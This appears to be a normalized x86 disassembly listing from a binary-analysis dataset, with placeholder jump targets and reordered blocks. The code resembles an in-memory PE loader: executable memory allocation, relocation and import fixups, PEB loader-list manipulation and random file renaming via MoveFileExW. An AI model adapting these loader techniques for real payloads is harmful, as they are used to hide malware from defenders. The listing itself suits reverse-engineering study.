cmp [ esi + 0x28 ] 0x0
jne r-xdata
push eax
call [ FreeLibrary@IAT ]
push [ esi ]
call ebx
lea esi [ esi - 0x4 ]
dec edi
jne r-xdata
inc edi
push 0x44
lea eax [ ebp - 0x1058 ]
push 0x0
push eax
mov [ ebp - 0x107c ] 0x0
call sub_406ba0
add esp 0xc
mov [ ebp - 0x1058 ] 0x44
cmp [ esi + 0x8 ] 0x1
jne r-xdata
xorps xmm0 xmm0
movq [ ebp - 0x1068 ] xmm0
movq [ ebp - 0x1060 ] xmm0
mov edx [ esi + 0xc ]
mov [ ebp - 0x1084 ] edx
lea eax [ esi + 0x38 ]
test edx edx
je r-xdata
xor eax eax
mov [ ebp - 0x102c ] 0x1
mov [ ebp - 0x1028 ] ax
mov [ ebp - 0x107c ] 0x8000020
mov [ ebp - 0x106c ] eax
lea edx [ eax + 0x2 ]
mov ecx eax
mov [ ebp - 0x106c ] eax
lea esi [ ecx + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
lea esi [ eax + 0x3 ]
lea eax [ esi + esi ]
push eax
call sub_4040b9
push [ ebp - 0x106c ]
mov ebx eax
push r--data
push esi
push ebx
call sub_40414b
add esp 0x14
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx esi
sar ecx 0x1
lea esi [ edx + 0x2 ]
mov ax [ edx ]
add edx 0x2
test ax ax
jne r-xdata
sub edx esi
sar edx 0x1
lea esi [ ecx + 0x4 ]
add esi edx
lea eax [ esi + esi ]
push eax
call sub_4040b9
push [ ebp - 0x1084 ]
mov ebx eax
push [ ebp - 0x106c ]
push r--data
push esi
push ebx
call sub_40414b
add esp 0x18
jmp r-xdata
lea eax [ ebp - 0x1068 ]
push eax
lea eax [ ebp - 0x1058 ]
push eax
mov eax [ ebp - 0x1078 ]
push 0x0
mov eax [ eax ]
push 0x0
push [ ebp - 0x107c ]
add eax 0x38
push 0x0
push 0x0
push 0x0
push ebx
push eax
call [ CreateProcessW@IAT ]
push ebx
call sub_404081
mov ebx [ CloseHandle@IAT ]
add esp 0x4
push [ ebp - 0x1068 ]
call ebx
push [ ebp - 0x1064 ]
call ebx
mov ebx [ ebp - 0x1070 ]
jmp r-xdata
sub_4034b0
push ebp
mov ebp esp
sub esp 0x18
mov eax ecx
push ebx
mov ebx [ eax ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ebx
test ebx ebx
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push ebx
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
test al 0x10
jne r-xdata
push esi
push edi
push 0x0
call sub_404339
cdq
sub eax edx
sar eax 0x1
push eax
call sub_404329
call sub_404306
xor edx edx
mov ecx 0x7
div ecx
push 0x5c
push ebx
lea edi [ edx + 0x1 ]
mov [ ebp - 0x8 ] edi
call sub_404198
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea eax [ esi + edi ]
lea eax [ eax * 2 + 0xa ]
push eax
call sub_4040b9
mov edi eax
lea eax [ esi + esi ]
push eax
push ebx
push edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] eax
call sub_406550
mov edx [ ebp - 0x8 ]
movq xmm0 [ r--data ]
lea ecx [ esi + edx ]
add esp 0x10
movq [ edi + ecx * 2 ] xmm0
mov ax [ r--data ]
xor ebx ebx
mov [ edi + ecx * 2 + 0x8 ] ax
mov [ ebp - 0x4 ] ebx
sub esi ebx
sar esi 0x1
inc esi
test edi edi
je r-xdata
mov esi [ ebp - 0xc ]
add esi edi
mov ebx edx
mov edi 0x34
mov esi [ ebp - 0x14 ]
push 0x1
push edi
push esi
call [ MoveFileExW@IAT ]
test eax eax
jne r-xdata
push edi
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
call sub_404306
xor edx edx
div edi
lea esi [ esi + 0x2 ]
mov ax [ edx * 2 + r--data ]
mov [ esi - 0x2 ] ax
dec ebx
jne r-xdata
mov edi [ ebp - 0x10 ]
mov ebx [ ebp - 0x4 ]
push 0x4
push 0x0
push edi
call [ MoveFileExW@IAT ]
mov eax [ ebp - 0x18 ]
push esi
mov [ eax ] edi
call sub_404081
add esp 0x4
mov ecx edi
call sub_403620
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
inc ebx
mov [ ebp - 0x4 ] ebx
cmp ebx 0x800
jbe r-xdata
test al 0x10
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push edi
call [ LoadLibraryW@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test edx edx
je r-xdata
push edi
call sub_404081
add esp 0x4
cmp ebx 0x400
jbe r-xdata
sub_403620
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov ebx ecx
push 0x5c
push ebx
call sub_404198
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
add esi 0x2
mov esi ebx
jmp r-xdata
push 0x104
lea eax [ ebp - 0x108 ]
push 0x0
push eax
call sub_406ba0
add esp 0xc
sub edi esi
push 0x0
push 0x0
sar edi 0x1
push edi
lea eax [ ebp - 0x108 ]
push eax
push edi
push esi
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov ecx esi
lea edx [ ecx + 0x2 ]
push 0x2e
push esi
call sub_404198
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_404072
mov esp ebp
pop ebp
retn
mov ecx ebx
call sub_402530
mov ecx ebx
mov edi eax
call sub_4024b0
mov esi eax
test esi esi
je r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
lea edi [ ebx + ecx * 2 ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_404072
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x108 ]
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push 0x8
push ecx
lea eax [ ecx + 0x1 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
mov edx edi
mov ecx esi
call sub_4025b0
add esp 0x14
push esi
test al al
jne r-xdata
call [ UnmapViewOfFile@IAT ]
call [ UnmapViewOfFile@IAT ]
sub_403730
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax 0x5a4d
push edi
mov [ ebp - 0xc ] edx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x10 ] ebx
cmp [ esi ] ax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_404072
mov esp ebp
pop ebp
retn
mov edi [ esi + 0x3c ]
add edi esi
mov [ ebp - 0x14 ] edi
cmp [ edi ] 0x4550
jne r-xdata
mov eax 0x14c
cmp [ edi + 0x4 ] ax
jne r-xdata
movzx eax [ edi + 0x16 ]
shr eax 0xd
and eax 0x1
mov [ ebx + 0x28 ] eax
cmp [ edi + 0xe8 ] 0x0
je r-xdata
mov [ ebx + 0x1c ] 0x0
mov eax [ edi + 0x50 ]
mov [ ebp - 0x8 ] eax
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0x40
push 0x3000
push eax
push [ edi + 0x34 ]
call [ VirtualAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0x40
push 0x3000
push edx
push eax
mov [ ebx + 0x1c ] 0x1
call [ VirtualAlloc@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push [ edi + 0x54 ]
push [ ebp - 0x18 ]
push esi
call sub_406550
movzx ecx [ edi + 0x6 ]
add esp 0xc
mov [ ebp - 0x8 ] ecx
test ecx ecx
jne r-xdata
push 0x40
push 0x3000
push [ ebp - 0x8 ]
push eax
call [ VirtualAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0xc ]
push esi
push eax
call sub_406550
mov ecx [ ebp - 0x10 ]
mov [ ebx + 0x2c ] ecx
mov eax [ edi + 0x28 ]
add esp 0xc
add eax ecx
mov [ ebx + 0x34 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x30 ] eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_404072
mov esp ebp
pop ebp
retn
movzx eax [ edi + 0x14 ]
test ecx ecx
je r-xdata
push 0x8000
push 0x0
push esi
call [ VirtualFree@IAT ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_404072
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x28 ]
add eax esi
mov ecx esi
mov [ ebx + 0x34 ] eax
call sub_403a60
test eax eax
je r-xdata
lea ebx [ edi + 0x2c ]
mov edi [ ebp - 0x18 ]
add ebx eax
mov [ ebp - 0xc ] ecx
lea esp [ esp ]
mov ecx esi
call sub_403d10
mov eax [ esi + 0x3c ]
movzx edx [ edi + 0x16 ]
xor ecx ecx
cmp [ eax + esi + 0xc0 ] ecx
setne cl
and edx 0x2000
mov [ ebp - 0x14 ] ecx
mov ecx esi
call sub_4039b0
mov ecx esi
call sub_403af0
test eax eax
je r-xdata
push [ ebx - 0x4 ]
mov eax [ ebx ]
add eax edi
push eax
mov eax [ ebx - 0x8 ]
add eax esi
push eax
call sub_406550
add esp 0xc
dec [ ebp - 0xc ]
lea ebx [ ebx + 0x28 ]
jne r-xdata
mov edi [ ebp - 0x14 ]
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x8 ] 0x0
movzx eax [ edi + 0x14 ]
jbe r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x8 ]
add edi 0x20
add edi eax
mov edi edi
mov [ ebx + 0x2c ] esi
mov ecx [ edi + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
call sub_403950
push eax
mov eax [ edi + 0x4 ]
push [ edi ]
add eax esi
push eax
call [ VirtualProtect@IAT ]
lea edi [ edi + 0x28 ]
dec ebx
jne r-xdata
mov ebx [ ebp - 0x10 ]
sub_403950
xor eax eax
test ecx 0x4000000
mov edx 0x200
cmovne eax edx
test ecx 0x20000000
je r-xdata
test ecx 0x40000000
je r-xdata
test ecx 0x40000000
je r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
or eax 0x1
retn
or eax 0x8
retn
or eax 0x2
retn
or eax 0x4
retn
or eax 0x10
retn
or eax 0x80
retn
or eax 0x20
retn
or eax 0x40
retn
sub_4039b0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xorps xmm0 xmm0
movq [ ebp - 0x28 ] xmm0
movq [ ebp - 0x20 ] xmm0
movq [ ebp - 0x10 ] xmm0
movq [ ebp - 0x18 ] xmm0
mov [ ebp - 0x28 ] 0x20
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x24 ] 0x88
mov [ ebp - 0x20 ] 0x0
push 0x18
test edx edx
je r-xdata
push 0x1
push ecx
call [ FindResourceA@IAT ]
mov [ ebp - 0x14 ] 0x1
push 0x2
push ecx
call [ FindResourceA@IAT ]
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call [ CreateActCtxA@IAT ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_404072
mov esp ebp
pop ebp
retn
test eax eax
jne r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push eax
call [ ActivateActCtx@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_404072
mov esp ebp
pop ebp
retn
sub_403a60
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx ecx
mov eax [ ebx + 0x3c ]
mov ecx [ eax + ebx + 0x34 ]
mov [ ebp - 0x4 ] ecx
cmp ebx ecx
je r-xdata
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ eax + ebx + 0xa0 ]
test eax eax
jne r-xdata
cmp [ eax + ebx ] 0x0
push esi
lea esi [ eax + ebx ]
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
pop esi
push edi
add esi [ eax ]
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
mov edi [ esi + 0x4 ]
lea eax [ esi + 0x4 ]
sub edi 0x8
shr edi 0x1
mov [ ebp - 0x8 ] eax
mov edx 0x0
je r-xdata
pop edi
movzx eax [ esi + edx * 2 + 0x8 ]
test eax 0xf000
je r-xdata
inc edx
cmp edx edi
jb r-xdata
and eax 0xfff
add eax [ esi ]
lea ecx [ eax + ebx ]
mov eax ebx
sub eax [ ebp - 0x4 ]
add [ ecx ] eax
mov eax [ ebp - 0x8 ]
sub_403af0
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx ecx
mov [ ebp - 0xc ] ebx
mov eax [ ebx + 0x3c ]
mov eax [ eax + ebx + 0x80 ]
test eax eax
jne r-xdata
push esi
push edi
lea edi [ eax + ebx ]
mov [ ebp - 0x8 ] edi
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ GetProcAddress@IAT ]
jmp r-xdata
add eax ebx
push eax
call [ LoadLibraryA@IAT ]
mov edx eax
mov [ ebp - 0x4 ] edx
test edx edx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov edi [ edi + 0x10 ]
mov ecx [ ecx ]
add edi ebx
test ecx ecx
je r-xdata
mov ebx edi
add ebx ecx
jmp r-xdata
mov edi [ ebp - 0x8 ]
add edi 0x14
mov [ ebp - 0x8 ] edi
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
jns r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov ebx [ ebp - 0xc ]
jmp r-xdata
mov esi [ ebp - 0xc ]
add esi 0x2
add esi eax
mov ecx r--data
mov eax esi
nop
movzx eax [ ebx ]
push eax
push edx
jmp r-xdata
sbb eax eax
or eax 0x1
test dl dl
je r-xdata
call esi
mov ecx r--data
mov eax esi
lea ebx [ ebx ]
push r--data
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
add ebx 0x4
add edi 0x4
test eax eax
jne r-xdata
sbb eax eax
or eax 0x1
test dl dl
je r-xdata
mov esi [ GetProcAddress@IAT ]
push [ ebp - 0x4 ]
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov ecx r--data
mov eax esi
mov esi [ GetProcAddress@IAT ]
mov eax sub_402690
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sbb eax eax
or eax 0x1
test dl dl
je r-xdata
mov [ edi ] eax
test eax eax
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov ecx r--data
mov eax esi
mov esi [ GetProcAddress@IAT ]
mov eax sub_402700
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sbb eax eax
or eax 0x1
test dl dl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov eax r--data
mov ecx esi
lea ecx [ ecx ]
mov esi [ GetProcAddress@IAT ]
mov eax sub_402660
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sbb eax eax
or eax 0x1
test dl dl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
mov eax sub_402630
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ ecx + 0x1 ]
cmp dl [ eax + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
test eax eax
jne r-xdata
add ecx 0x2
add eax 0x2
test dl dl
jne r-xdata
mov dl [ ecx ]
cmp dl [ eax ]
jne r-xdata
sub_403d10
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx ecx
push esi
mov esi [ ebx + 0x3c ]
add esi ebx
call [ GetProcessHeap@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
push edi
push 0x268
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov edi eax
mov [ edi + 0x18 ] ebx
mov ecx [ esi + 0x50 ]
mov [ edi + 0x20 ] ecx
mov ecx [ esi + 0x28 ]
add ecx ebx
mov [ edi + 0x1c ] ecx
mov ecx [ esi + 0x58 ]
mov [ edi + 0x3c ] ecx
mov [ edi + 0x38 ] 0xffff0001
mov eax [ esi + 0x8 ]
mov [ edi + 0x44 ] eax
mov [ edi + 0x34 ] 0x44000
cmp ebx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax 0x2000
test [ esi + 0x16 ] ax
je r-xdata
mov [ edi + 0x34 ] 0x244000
lea eax [ edi + 0x50 ]
mov [ edi + 0x54 ] eax
mov [ eax ] eax
lea eax [ edi + 0x60 ]
mov [ edi + 0x64 ] eax
mov [ eax ] eax
lea eax [ edi + 0x58 ]
mov [ edi + 0x5c ] eax
mov [ eax ] eax
mov eax [ fs : 0x30 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x8 ] eax
mov esi [ eax + 0x14 ]
mov eax [ esi + 0x24 ]
mov [ edi + 0x2c ] eax
mov eax [ esi + 0x28 ]
mov [ edi + 0x30 ] eax
movzx eax [ esi + 0x26 ]
push eax
push 0x8
push [ ebp - 0x4 ]
call [ HeapAlloc@IAT ]
mov [ edi + 0x30 ] eax
movzx ecx [ esi + 0x26 ]
push ecx
push [ esi + 0x28 ]
push ecx
push eax
call sub_404388
add esp 0x10
lea edx [ edi + 0x24 ]
lea ecx [ esi + 0x1c ]
call sub_403e50
mov esi [ ebp - 0x8 ]
mov eax [ esi + 0x14 ]
lea ecx [ esi + 0x14 ]
cmp eax ecx
je r-xdata
or [ edi + 0x34 ] 0x80004
mov edx [ eax + 0x4 ]
lea ecx [ edi + 0x8 ]
mov eax [ edx + 0x4 ]
mov [ ecx ] edx
mov [ edi + 0xc ] eax
mov [ eax ] ecx
mov [ edx + 0x4 ] ecx
mov eax [ esi + 0x10 ]
lea ecx [ esi + 0xc ]
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
mov [ eax ] edi
mov [ ecx + 0x4 ] edi
mov eax [ esi + 0x20 ]
lea edx [ esi + 0x1c ]
lea ecx [ edi + 0x10 ]
mov [ edi + 0x14 ] eax
mov [ ecx ] edx
mov [ eax ] ecx
mov eax edi
pop edi
pop esi
mov [ edx + 0x4 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea esp [ esp ]
mov eax [ eax ]
cmp eax ecx
jne r-xdata
cmp [ eax + 0x10 ] ebx
ja r-xdata
sub_403e50
push ebx
mov ebx ecx
push esi
movzx eax [ ebx + 0x2 ]
push edi
mov edi edx
add ax 0x4
mov [ edi + 0x2 ] ax
movzx eax [ ebx ]
add ax 0x4
mov [ edi ] ax
movzx eax [ edi + 0x2 ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ edi + 0x4 ] eax
movzx ecx [ ebx + 0x2 ]
push ecx
push [ ebx + 0x4 ]
movzx ecx [ edi + 0x2 ]
push ecx
push eax
call sub_404388
push 0x5c
push [ ebx + 0x4 ]
call sub_404198
mov esi eax
add esp 0x18
test esi esi
jne r-xdata
add esi 0x2
mov esi [ ebx + 0x4 ]
jmp r-xdata
mov eax [ edi + 0x4 ]
mov ecx esi
sub ecx [ ebx + 0x4 ]
xor edx edx
sar ecx 0x1
push r--data
mov [ eax + ecx * 2 ] dx
movzx eax [ edi + 0x2 ]
shr eax 0x1
push eax
push [ edi + 0x4 ]
call sub_40423e
movzx eax [ edi + 0x2 ]
push esi
shr eax 0x1
push eax
push [ edi + 0x4 ]
call sub_40423e
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_403eed
push 0x14
push r--data
call sub_405550
push 0x1
call sub_405391
pop ecx
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
mov [ ebp - 0x1c ] ebx
call sub_404dbf
test eax eax
jne r-xdata
xor ebx ebx
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_404822
test eax eax
jne r-xdata
push 0x1c
call sub_404041
cmp [ eax + r--data ] ebx
setne bl
call sub_405478
and [ ebp - 0x4 ] 0x0
call sub_404dd5
test eax eax
jns r-xdata
push 0x10
call sub_404041
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_4054b8
mov [ rw-data ] eax
call sub_405083
test eax eax
jns r-xdata
push 0x1b
call sub_404041
call sub_4052b0
test eax eax
jns r-xdata
push 0x8
call sub_4048fd
push 0x1
call sub_404937
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_4048fd
mov eax [ rw-data ]
mov [ rw-data ] eax
push eax
push [ rw-data ]
push [ rw-data ]
call sub_4027c0
add esp 0xc
mov esi eax
mov [ ebp - 0x24 ] esi
test ebx ebx
jne r-xdata
push eax
call sub_4048fd
call sub_404928
jmp r-xdata
push esi
call sub_404b93
mov [ ebp - 0x4 ] 0xfffffffe
mov eax esi
call sub_405595
retn
sub_404081
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_4058af
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_4058c2
pop ecx
mov [ esi ] eax
pop esi
sub_4040b9
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_405903
pop ecx
call sub_4058af
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
test esi esi
je r-xdata
call sub_404ba7
push 0x1e
call sub_404c04
push 0xff
call sub_4048e7
xor ecx ecx
inc ecx
mov ecx esi
jmp r-xdata
mov eax edi
pop edi
pop ebx
jmp r-xdata
push 0xc
pop ebx
cmp [ rw-data ] eax
je r-xdata
push ecx
push 0x0
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop esi
pop ebp
retn
call sub_4058af
mov [ eax ] ebx
push esi
call sub_405903
pop ecx
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
jmp r-xdata
call sub_4058af
mov [ eax ] ebx
sub_404198
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] 0x2
jge r-xdata
mov edx [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx ecx
lea eax [ edx + 0x1 ]
test al 0xe
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
mov ax [ ebp + 0xc ]
movzx eax [ edx ]
cmp ax cx
jne r-xdata
xor eax eax
cmp ax cx
jne r-xdata
cmp [ ecx ] ax
jne r-xdata
cmp [ ecx ] ax
jne r-xdata
test ax ax
je r-xdata
mov esi edx
movzx eax cx
movd xmm0 eax
mov eax 0xffff0001
movd xmm1 eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ecx
jmp r-xdata
sub ecx 0x2
cmp ecx edx
je r-xdata
mov eax esi
add edx 0x2
je r-xdata
lea esi [ edx + ecx * 2 ]
movdqu xmm0 [ edx ]
pcmpistri xmm1 xmm0 0x15
jne r-xdata
pop esi
pop ebp
retn
add edx 0x10
jmp r-xdata
add edx 0x10
lea eax [ edx + ecx * 2 ]
jmp r-xdata
movdqu xmm1 [ edx ]
pcmpistri xmm0 xmm1 0x41
jae r-xdata
sub_40423e
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
call sub_4058af
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi edi
xor eax eax
mov [ edi ] ax
test ecx ecx
je r-xdata
add esi 0x2
dec ecx
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
xor eax eax
test ecx ecx
jne r-xdata
dec ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ edi ] ax
call sub_4058af
push 0x22
jmp r-xdata
movzx eax [ edx ]
mov [ esi + edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_405a91
mov eax esi
sub_4042aa
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4058af
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
xor eax eax
mov [ esi ] ax
xor eax eax
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_4058af
push 0x22
jmp r-xdata
movzx eax [ ecx ]
mov [ edi + ecx ] ax
lea ecx [ ecx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_405a91
mov eax esi
sub_404339
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
push 0x0
add ecx 0x2ac18000
push 0x989680
adc eax 0xfe624e21
push eax
push ecx
call sub_4064e0
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_404388
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_4058af
push 0x16
pop esi
mov [ eax ] esi
call sub_405a91
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push eax
call sub_406ba0
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
call sub_4058af
push 0x16
jmp r-xdata
push esi
push edi
push eax
call sub_406550
add esp 0xc
xor eax eax
jmp r-xdata
push 0x16
pop eax
call sub_4058af
push 0x22
pop esi
mov [ eax ] esi
call sub_405a91
mov eax esi
jmp r-xdata
pop edi
sub_404407
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_406c30
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
je r-xdata
sub_404456
push ebp
mov ebp esp
push esi
call sub_404700
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov edx [ esi + 0x5c ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
lea eax [ edx + 0x90 ]
cmp ecx eax
jae r-xdata
add ecx 0xc
lea eax [ edx + 0x90 ]
cmp ecx eax
jb r-xdata
xor ecx ecx
cmp [ ecx ] edi
je r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
mov edx [ ecx + 0x8 ]
test edx edx
je r-xdata
test ecx ecx
je r-xdata
cmp edx 0x5
jne r-xdata
cmp edx 0x1
jne r-xdata
and [ ecx + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] eax
cmp [ ecx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
pop edi
push [ ecx + 0x4 ]
and [ ecx + 0x8 ] 0x0
call edx
push 0x24
pop edi
mov eax [ esi + 0x5c ]
add edi 0xc
and [ edi + eax - 0x4 ] 0x0
cmp edi 0x90
jl r-xdata
cmp [ ecx ] 0xc000008e
mov edi [ esi + 0x64 ]
jne r-xdata
cmp [ ecx ] 0xc0000090
